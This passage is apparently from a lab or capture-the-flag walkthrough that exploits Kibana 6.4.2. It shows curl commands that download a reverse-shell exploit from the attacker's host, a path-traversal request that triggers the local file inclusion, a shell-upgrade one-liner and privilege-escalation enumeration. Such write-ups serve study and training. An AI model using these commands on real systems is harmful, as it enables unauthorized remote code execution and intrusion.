
ps aux | grep kibana
1
	
ps aux | grep kibana

We use curl for exploring the service running on localhost via port 5061 and luckily found the installed version 6.4.2 of the kibana.
curl http://127.0.0.1:5601
1
	
curl http://127.0.0.1:5601

Exploiting Kibana

Hmmm! So, it was time hunt for its exploit if available on the internet. Fruitfully we got an exploit from github and according to this exploit a Local File Inclusion on Kibana found by CyberArk Labs, the LFI can be used to execute a reverse shell on the Kibana server.

So, I just download the exploit code to my local machine and change the “attacker’s Address” as shown in the image and save the file with the name “raj.js” It was time to transfer the exploit to the host machine and start the Netcat listener that receives the host machine’s reverse connection.

Now it was time to inject the payload on the vulnerable application, thus we downloaded the exploit “raj.js” into /tmp directory of the host machine.
curl -O http://10.10.14.12:8000/raj.js
curl http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../tmp/raj.js
1
2
	
curl -O http://10.10.14.12:8000/raj.js
curl http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../tmp/raj.js

Soon you will get the reverse connection of the host machine via Netcat session as shown in the below image.
python -c 'import pty;pty.spawn("/bin/bash")'
1
	
python -c 'import pty;pty.spawn("/bin/bash")'

So, it was time to escalate privilege for user kibana and for this, we enumerate the proc running under kibana group with the help of find command.
find / -group kibana 2>/dev/null | grep -v proc
1
	
find / -group kibana 2>/dev/null | grep -v proc

We found some three interesting .conf file: filter.conf, input.conf, output.conf at /etc/logstash.
